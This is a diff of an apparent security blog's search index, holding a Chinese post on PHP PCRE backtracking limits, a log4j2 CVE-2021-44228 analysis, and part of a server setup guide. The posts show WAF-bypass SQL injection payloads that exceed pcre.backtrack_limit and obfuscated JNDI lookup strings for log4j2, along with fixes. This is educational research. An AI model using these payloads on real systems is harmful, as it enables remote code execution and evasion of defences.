@@ -178,73 +178,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>PHP的PCRE库回溯问题</title>
-    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
-<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
-<p>DFA与NFA机制上的不同带来3种主要影响：</p>
-<ol>
-<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
-<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
-<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
-</ol>
-<p><strong>针对第2点，这里举个例子来说明：</strong></p>
-<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
-<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
-
-<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
-<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
-<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
-<p>　　量词：{m,n}：m到n个</p>
-<p>　　　　　*：任意多个</p>
-<p>　　　　　+：一个到多个</p>
-<p>　　　　　？：0或一个</p>
-<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">
-
-<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">
-
-<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">
-
-<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">
-
-<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">
-
-<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
-<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>当回溯次数大于1000000会有什么问题呢？</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
-
-<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
-<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">
-
-<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
-<p><strong>修复方法</strong></p>
-<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>SSRF绕过姿势汇总</title>
     <url>/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</url>
     <content><![CDATA[<h2 id="1-符号绕过"><a href="#1-符号绕过" class="headerlink" title="1. @符号绕过"></a>1. @符号绕过</h2><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p>
@@ -316,7 +249,7 @@
   <entry>
     <title>log4j2 RCE分析与复现</title>
     <url>/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的:smile:</p>
+    <content><![CDATA[<p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的😀</p>
 <h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p>
 <img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173">
 
@@ -372,7 +305,7 @@
 <p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p>
 <img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458">
 
-<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（绕过思路1），这里判断较多，就不挨个描述，简单概括为</p>
+<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（变形思路1），这里判断较多，就不挨个描述，简单概括为</p>
 <ul>
 <li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
 <li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
@@ -391,8 +324,8 @@
 <p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p>
 <img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342">
 
-<h2 id="0x02-变形思路"><a href="#0x02-变形思路" class="headerlink" title="0x02 变形思路"></a>0x02 变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
-<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面可以看到<code>StrLookup</code>除了支持jndi协议还支持<code>&#123;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
+<h2 id="0x02-payload变形思路"><a href="#0x02-payload变形思路" class="headerlink" title="0x02 payload变形思路"></a>0x02 payload变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
+<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面分析中可以看到<code>StrLookup</code>除了支持jndi协议还支持<code>&#123;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>当然我们也可以组合上面两种思路，例如</p>
@@ -539,6 +472,73 @@
 ]]></content>
   </entry>
   <entry>
+    <title>PHP的PCRE库回溯问题</title>
+    <url>/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>最近发现对PCRE的回溯机制理解还是很模糊，决定再仔细复习记录下</p>
+<h2 id="DFA与NFA"><a href="#DFA与NFA" class="headerlink" title="DFA与NFA"></a>DFA与NFA</h2><p>先简单了解下DFA与NFA这两种正则引擎：DFA为确定性有穷自动机，是文本主导，NFA为非确定性有穷自动机，是表达式主导。</p>
+<p>DFA与NFA机制上的不同带来3种主要影响：</p>
+<ol>
+<li>DFA对于文本串里的每一个字符只需扫描一次，比较快，但特性较少；NFA要翻来覆去吃字符、吐字符，速度慢，但是特性丰富，所以反而应用广泛，当今主要的正则表达式引擎，如Perl、Ruby、Python的re模块、Java和.NET的regex库，都是NFA的。</li>
+<li>NFA急于邀功请赏，所以最左子正则式优先匹配成功，因此偶尔会错过最佳匹配结果；DFA则是“最长的左子正则式优先匹配成功”。</li>
+<li>NFA可能会陷入递归调用的陷阱而表现得性能极差。</li>
+</ol>
+<p><strong>针对第2点，这里举个例子来说明：</strong></p>
+<p>比如正则表达式<code>/aaa|aaabbb/</code>与字符串<code>aaabbbccc</code>匹配，在php和awk的匹配结果就不一样。</p>
+<p>php的pcre库是NFA引擎，<strong>匹配结果是aaa</strong>。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; preg_match(<span class="string">&#x27;/aaa|aaabbb/&#x27;</span>,<span class="string">&#x27;aaabbbccc&#x27;</span>,<span class="variable">$matches</span>);</span><br><span class="line">php &gt; print_r(<span class="variable">$matches</span>);</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; aaa</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>awk使用的是DFA引擎，这里通过awk的sub函数将正则匹配中的内容替换为<code>(replace)</code>，可以看到<strong>匹配中的是aaabbb</strong>。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
+<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
+<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
+<p>　　量词：{m,n}：m到n个</p>
+<p>　　　　　*：任意多个</p>
+<p>　　　　　+：一个到多个</p>
+<p>　　　　　？：0或一个</p>
+<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">
+
+<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">
+
+<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">
+
+<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">
+
+<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">
+
+<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
+<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>当回溯次数大于1000000会有什么问题呢？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
+<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">
+
+<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
+<p><strong>修复方法</strong></p>
+<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>《静态程序分析（南京大学）》课程笔记</title>
     <url>/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>注：⭐️符号代表重要的知识点，课程还未学习完，笔记更新中ing</p>
@@ -640,50 +640,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>手动搭建nginx+php-fpm+mysql环境--信安之路实验</title>
-    <url>/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/</url>
-    <content><![CDATA[<h2 id="0x01-关键过程"><a href="#0x01-关键过程" class="headerlink" title="0x01 关键过程"></a>0x01 关键过程</h2><h3 id="1-安装nigix"><a href="#1-安装nigix" class="headerlink" title="1.安装nigix"></a>1.安装nigix</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install nginx	#安装nginx</span><br><span class="line">service nginx start		#启动nginx</span><br></pre></td></tr></table></figure>
-
-<p>安装后浏览器访问本地ip。</p>
-<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564584947181.png" class="" width="1564584947181">
-
-<h3 id="2-安装php7-2-fpm和配置nginx"><a href="#2-安装php7-2-fpm和配置nginx" class="headerlink" title="2.安装php7.2-fpm和配置nginx"></a>2.安装php7.2-fpm和配置nginx</h3><ol>
-<li><p><strong>安装php7.2</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install php7.2-fpm</span><br></pre></td></tr></table></figure></li>
-<li><p><strong>修改nginx配置文件</strong></p>
-<p>为使nginx支持php解析，需设置fastcgi解析器的路径，修改nginx安装目录的文件<code>/etc/nginx/sites-available/default</code>，如图。</p>
-<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564585815801.png" class="" width="1564585815801">
-
-<p>重启nginx。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure></li>
-<li><p><strong>设置php-fpm的监听端口</strong></p>
-<p>修改php-fpm安装目录下配置文件<code>/etc/php/7.2/fpm/pool.d/www.conf</code>，查看是否同nginx配置文件的路径或监听的端口一致，如图。</p>
-<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564586839658.png" class="" width="1564586839658"></li>
-<li><p><strong>测试配置是否成功</strong></p>
-<p>进入<code>/var/www/html/</code>目录下添加<code>test.php</code>测试文件，浏览器访问（若第三步未配置会报502错误），配置成功情况如下图。</p>
-</li>
-</ol>
-<img src="/2021/06/14/%E6%89%8B%E5%8A%A8%E6%90%AD%E5%BB%BAnginx-php-fpm-mysql%E7%8E%AF%E5%A2%83-%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF%E5%AE%9E%E9%AA%8C/1564587125109.png" class="" width="1564587125109">
-
-<h3 id="3-安装mysql"><a href="#3-安装mysql" class="headerlink" title="3.安装mysql"></a>3.安装mysql</h3><ol>
-<li><p>安装mysql</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get -y install mysql-server mysql-client	#安装mysql</span><br><span class="line">apt-get install php7.2-mysql	#安装php支撑mysql的模块</span><br></pre></td></tr></table></figure></li>
